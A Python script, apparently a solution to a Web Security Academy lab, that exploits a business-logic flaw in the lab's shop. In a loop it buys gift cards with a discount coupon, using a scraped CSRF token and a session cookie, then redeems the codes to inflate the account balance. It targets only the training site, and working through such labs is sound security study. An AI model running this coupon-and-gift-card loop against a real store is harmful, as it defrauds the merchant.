import requests, typer

from lxml import html
from bs4 import BeautifulSoup



def main(ctf_session_code: str, session_cookie: str):

    CTF_SESSION_CODE = ctf_session_code # To fill with typer arg
    SESSION_COOKIE = session_cookie # To fill with typer arg
    CTF_URL = 'https://' + CTF_SESSION_CODE + '.web-security-academy.net/'
    cookie = {"session" : SESSION_COOKIE}

    round = 0
    while True:
        print("-----------------------------------------------------------")
        round+=1
        print("Round "+str(round))
        response = requests.get(CTF_URL+'cart',cookies=cookie)
        node= html.fromstring(response.text)
        cashXhtml = node.xpath('//header[@class="navigation-header"]/p/strong')
        cash = cashXhtml[0].text.split()[2].split('$')[1].split('.')[0]
        print("Cash available $" + cash)

        #Insert giftCards in cart
        giftCardNumber = str(int(int(cash)/10))
        if int(giftCardNumber) > 99:
            giftCardNumber = '99'
        insertElement = {"productId":"2","redir":"PRODUCT","quantity": giftCardNumber}
        insertProductResponse = requests.post(CTF_URL+'cart', cookies=cookie, data=insertElement)
        print("Added "+ giftCardNumber + " giftcards in cart")

        #CSRF Token 
        response = requests.get(CTF_URL+'cart',cookies=cookie)
        node = html.fromstring(response.text)
        soup = BeautifulSoup(response.text, 'lxml')
        csrfToken = soup.find('input', attrs={'name': 'csrf'})['value']

        #apply coupon code:
        couponData= {"csrf":csrfToken , "coupon":"SIGNUP30"}
        insertCouponResponse = requests.post(CTF_URL+'cart/coupon', cookies=cookie, data=couponData)

        #buy giftcard and see new coupon:
        csrfData= {"csrf":csrfToken}
        insertCouponResponse = requests.post(CTF_URL+'cart/checkout', cookies=cookie, data=csrfData)
        node = html.fromstring(insertCouponResponse.text)
        couponsXhtml = node.xpath('//table[@class="is-table-numbers"]/tbody/tr/td')

        coupons = list()
        for c in couponsXhtml:
            coupons.append(c.text)
        #print(coupons)
        print("Redeem all codes...")
        for coupon in coupons:
            #print(code)
            response = requests.get(CTF_URL+'my-account',cookies=cookie)
            node = html.fromstring(response.text)
            soup = BeautifulSoup(response.text, 'lxml')
            csrfToken = soup.find('input', attrs={'name': 'csrf'})['value']
            data= {"csrf":csrfToken,"gift-card":coupon}
            insertCouponResponse = requests.post(CTF_URL+'gift-card', cookies=cookie, data=data)

if __name__ == "__main__":
    typer.run(main)